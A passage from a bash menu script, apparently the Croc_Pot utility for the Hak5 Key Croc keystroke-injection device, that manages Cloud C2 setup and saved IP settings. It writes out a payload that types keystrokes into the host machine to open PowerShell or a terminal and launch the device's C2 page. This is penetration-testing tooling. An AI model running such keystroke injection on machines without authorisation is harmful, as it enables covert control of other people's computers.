			echo -ne "MATCH startc2\nCROC_OS=/root/udisk/loot/Croc_OS.txt\nif [ -e \${CROC_OS} ]; then\nLED G\nsystemctl restart hak5.service
sleep 5\nOS_CHECK=\$(sed -n 1p \${CROC_OS})\nif [ \"\${OS_CHECK}\" = WINDOWS ]; then\nQ GUI d\nQ GUI r\nsleep 1\nQ STRING \"powershell\"
Q ENTER\nsleep 2\nQ STRING \"Start-Process http://\$(ifconfig wlan0 | grep \"inet addr\" | awk '{print \$2}' | cut -c 6-)\"
Q ENTER\nsleep 5\nQ ALT-TAB\nsleep 2\nQ STRING \"exit\"\nQ ENTER\nelse\nHOST_CHECK=\$(sed -n 3p \${CROC_OS})\ncase \$HOST_CHECK in
raspberrypi)\nQ CONTROL-ALT-d\nQ CONTROL-ALT-t\nsleep 1\nQ STRING \"gio open http://\$(ifconfig wlan0 | grep \"inet addr\" | awk '{print \$2}' | cut -c 6-)\"
Q ENTER\nsleep 5\nQ ALT-TAB\nsleep 1\nQ ALT-F4;;\n$HOST_CHECK)\nQ ALT-t\nsleep 1
Q STRING \"gio open http://\$(ifconfig wlan0 | grep \"inet addr\" | awk '{print \$2}' | cut -c 6-)\"\nQ ENTER\nsleep 5\nQ ALT-TAB
sleep 1\nQ ALT-F4;;\n*)\nQ ALT F2\nsleep 1\nQ STRING \"xterm\"\nQ ENTER\nsleep 1\nQ STRING \"gio open http://\$(ifconfig wlan0 | grep \"inet addr\" | awk '{print \$2}' | cut -c 6-)\"
Q ENTER\nsleep 5\nQ ALT-TAB\nsleep 1\nQ ALT-F4;;\nesac\nfi\nelse\nLED G\nsystemctl restart hak5.service\nsleep 5\nfi" > "$quickcloud"
			ColorGreen 'Quick_Start_C2.txt is now installed check payloads folder\n' ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
fi
}
##
#----Hak5 Cloud_C2- Save Hak5 Cloud_C2- setup/ip
##
save_ip() {
	Info_Screen '- #1 will save the IP,Netmask,Gateway that is setup with C2
- #2 will restore the keycroc to saved IP,Netmask,Gateway
- #3 Manually add IP,Netmask,Gateway'
save_setup() {
	local cloud_ip=/root/udisk/tools/Croc_Pot/C2_IP.txt
run_save_v() {
	ifconfig wlan0 | grep "inet addr" | awk '{print $2}' | cut -c 6- | tee "$cloud_ip"
	/sbin/ifconfig wlan0 | awk '/Mask:/ {print $4;}' | sed -e 's/Mask://g' -e 's/^[\t]*//' | tee -a "$cloud_ip"
	ip r | grep default | sed -e 's/default//g' -e 's/via//g' -e 's/dev//g' -e 's/wlan0//g' -e 's/^[[:space:]]*//g' | tee -a "$cloud_ip"
}
if [ -f "$cloud_ip" ]; then
	ColorGreen 'C2_IP.txt file already exists\n'
	read_all 'REMOVE EXISTING AND SAVE NEW SETUP Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			ColorRed 'REMOVING EXISTING SETUP AND SAVING NEW\n'
			rm "$cloud_ip"
			run_save_v ;;
		[nN] | [nN][oO])
			ColorYellow 'KEEPING EXISTING SETUP\n' ;;
		*)
			invalid_entry ;;
	esac
else
	ColorYellow 'SAVING SETUP IP TO TOOLS/CROC_POT\n'
	run_save_v
fi
}
##
#----Hak5 Cloud_C2- restore keycroc ip to first setup Hak5 Cloud_C2
#----restore ip just for this session
##
restore_ip() {
	ColorYellow 'This will restore keycroc IP back to the IP when C2 was first setup\n'
	if [ -f "$cloud_ip" ]; then
		ColorYellow "Keycroc IP will change to this IP now $(sed -n 1p "$cloud_ip")\n"
		ColorYellow "Will need to start new ssh with this IP $(sed -n 1p "$cloud_ip")\n"
		read_all 'CHANGE KEYCROC IP Y/N AND PRESS [ENTER]'
		case "$r_a" in
			[yY] | [yY][eE][sS])
				ifconfig wlan0 "$(sed -n 1p "$cloud_ip")" netmask "$(sed -n 2p "$cloud_ip")"; route add default gw "$(sed -n 3p "$cloud_ip")" wlan0; ;;
			[nN] | [nN][oO])
				ColorYellow 'KEEPING EXISTING SETUP\n' ;;
			*)
				invalid_entry ;;
		esac
	else
		ColorRed 'DID NOT FIND ANY SAVED C2 SETTING PLEASE RUN #1 SAVE C2 SETUP IP\n'
		run_save_v
	fi
}
##
#----Hak5 Cloud_C2- edit keycroc ip to use for Hak5 C2
##
edit_ip() {
	ColorYellow 'Manually Enter IP,Netmask,Gateway for the keycroc\n'
	read_all 'CHANGE KEYCROC IP Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			read_all 'ENTER IP TO BE USED AND PRESS [ENTER'] ; ip_e="$r_a"
			read_all 'ENTER NETMASK TO BE USED AND PRESS [ENTER]' ; mask_e="$r_a"
			read_all 'ENTER GATEWAY TO BE USED AND PRESS [ENTER]' ; gate_e="$r_a"
			ifconfig wlan0 "$ip_e" netmask "$mask_e"; route add default gw "$gate_e" wlan0; ;;
		[nN] | [nN][oO])
			ColorYellow 'KEEPING EXISTING SETUP\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Display Hak5 C2 ip restore Menu
##
	MenuTitle 'SAVE C2 SETUP IP MENU'
	MenuColor 19 1 'SAVE C2 SETUP IP'
	MenuColor 19 2 'RESTORE C2 SETUP IP'
	MenuColor 19 3 'EDIT CROC IP'
	MenuColor 19 4 'RETURN TO MAIN MENU'
	MenuEnd 18
	case "$m_a" in
		1) save_setup ; hak_cloud ;;
		2) restore_ip ; hak_cloud ;;
		3) edit_ip ; hak_cloud ;;
		4) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; hak_cloud ;;
		[bB]) hak_cloud ;; [pP]) Panic_button ;; *) invalid_entry ; hak_cloud ;;
	esac
}
##
#----Display Hak5 Cloud_C2 menu
##
	MenuTitle 'HAK5 CLOUD C2 MENU'
	MenuColor 20 1 'HAK5 C2 SETUP'
	MenuColor 20 2 'START HAK5 C2'
	MenuColor 20 3 'RELOAD HAK5 C2'
	MenuColor 20 4 'RESTART HAK5 C2'
	MenuColor 20 5 'STOP HAK5 C2'
	MenuColor 20 6 'REMOVE HAK5 C2'
	MenuColor 20 7 'EDIT HAK5 C2'
	MenuColor 20 8 'QUICK START C2'
	MenuColor 20 9 'SAVE C2 SETUP IP'
	MenuColor 19 10 'RETURN TO MAIN MENU'
	MenuEnd 19
	case "$m_a" in
		1) cloud_setup ; hak_cloud ;;
		2) cloud_web ; hak_cloud ;;
		3) reload_cloud ; hak_cloud ;;
		4) systemctl restart hak5.service ; cloud_web ; hak_cloud ;;
		5) systemctl stop hak5.service ; hak_cloud ;;
		6) remove_cloud ; hak_cloud ;;
		7) nano /etc/systemd/system/hak5.service ; hak_cloud ;;
		8) quick_cloud ; hak_cloud ;;
		9) save_ip ;;
		10) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; hak_cloud ;;
		[bB]) main_menu ;; [pP]) Panic_button ;; *) invalid_entry ; hak_cloud ;;
	esac
}
##
#----Croc_Pot Display Main Menu
##
function main_menu() {
	croc_title && tput cup 6 0
	MenuTitle 'CROC POT MAIN MENU'
	MenuColor 16 1 'CROC MAIL' "$clear$blue${array[4]}"
	MenuColor 16 2 'CROC POT PLUS' "$clear$red${array[5]}"
	MenuColor 16 3 'KEYCROC STATUS' "$clear$green${array[6]}"
	MenuColor 16 4 'KEYCROC LOGS' "$clear$white${array[7]}"
	MenuColor 16 5 'KEYCROC EDIT' "$clear$yellow${array[8]}"
	MenuColor 16 6 'SSH MENU' "$clear$cyan${array[9]}"
	MenuColor 16 7 'RECOVERY MENU' "$clear$pink${array[10]}"
	MenuColor 16 8 'HAK5 CLOUD C2' "$clear$white${array[11]}"
	MenuEnd 16
	case "$m_a" in
		1) croc_mail ;;
		2) croc_pot_plus ;;
		3) croc_status ;;
		4) croc_logs_menu ;;
		5) croc_edit_menu ;;
		6) ssh_menu ;;
		7) croc_recovery ;;
		8) hak_cloud ;;
		0) exit ;;
		lock) Lock_keyboard ; main_menu ;;
		[pP]) Panic_button ;;
		kp | KP) start_icmp ; main_menu ;;
		st | ST) reset_broken ; main_menu ;;
		*) invalid_entry ; main_menu ;;
	esac
}
main_menu
exit
